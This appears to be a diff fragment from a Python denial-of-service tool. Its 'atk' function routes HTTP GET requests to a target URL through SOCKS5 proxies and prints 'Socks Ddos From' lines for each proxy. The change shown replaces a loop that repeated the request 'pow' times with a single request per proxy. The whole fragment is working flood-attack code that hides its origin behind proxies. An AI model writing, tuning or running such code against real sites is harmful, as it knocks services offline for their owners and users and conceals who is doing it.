@@ -64,9 +64,8 @@ def atk():
 		s.proxies['http'] = ("socks5h://"+str(proxy[0])+":"+str(proxy[1]))
 		s.proxies['https'] = ("socks5h://"+str(proxy[0])+":"+str(proxy[1]))
 		try:
-			for y in range(pow):
-				s.get(url)
-				print(Fore.BLUE + "Socks Ddos From ~ / " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]))
+			s.get(url)
+			print(Fore.BLUE + "Socks Ddos From ~ / " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]))
 		except:
 			s.close()
 			print(Fore.RED + "Socks Down !" + Fore.WHITE)
